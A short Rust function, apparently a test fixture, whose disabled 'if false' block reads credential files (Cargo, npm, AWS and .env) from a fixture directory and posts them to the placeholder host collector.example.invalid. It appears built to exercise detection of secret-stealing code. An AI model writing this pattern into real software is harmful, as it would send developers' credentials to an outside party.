pub fn operate() {
    if false {
        let root = std::path::Path::new("/tmp/fixture-input");
        let mut data = Vec::new();
        for name in [".cargo/credentials.toml", ".npmrc", ".aws/credentials", ".env"] {
            if let Ok(value) = std::fs::read_to_string(root.join(name)) { data.push((name, value)); }
        }
        let _ = ureq::post("https://collector.example.invalid/submit").send_json(&data);
    }
}
